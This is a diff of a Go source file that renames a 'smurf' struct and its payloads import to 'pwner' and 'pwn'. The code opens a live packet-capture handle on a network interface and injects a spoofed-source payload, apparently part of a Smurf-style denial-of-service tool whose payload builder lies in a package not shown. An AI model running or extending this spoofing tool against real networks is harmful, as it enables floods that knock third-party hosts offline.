@@ -3,17 +3,17 @@ package main
 import (
 	"net"
 
-	"github.com/adrianosela/smurf/payloads"
+	"github.com/adrianosela/pwn/payloads"
 	"github.com/google/gopacket/pcap"
 	"github.com/pkg/errors"
 )
 
-type smurf struct {
+type pwner struct {
 	wire    *pcap.Handle
 	payload []byte
 }
 
-func newSmurf(sIP, dIP net.IP, iface string, gwMAC net.HardwareAddr) (*smurf, error) {
+func newPwner(sIP, dIP net.IP, iface string, gwMAC net.HardwareAddr) (*pwner, error) {
 	wire, err := pcap.OpenLive(iface, 1024, false, pcap.BlockForever)
 	if err != nil {
 		return nil, errors.Wrap(err, "could not open live")
@@ -31,16 +31,16 @@ func newSmurf(sIP, dIP net.IP, iface string, gwMAC net.HardwareAddr) (*smurf, er
 	if err != nil {
 		return nil, errors.Wrap(err, "could not build a spoofed payload")
 	}
-	return &smurf{
+	return &pwner{
 		wire:    wire,
 		payload: payload,
 	}, nil
 }
 
-func (s *smurf) execute() error {
-	return s.wire.WritePacketData(s.payload)
+func (p *pwner) execute() error {
+	return p.wire.WritePacketData(p.payload)
 }
 
-func (s *smurf) close() {
-	s.wire.Close()
+func (p *pwner) close() {
+	p.wire.Close()
 }
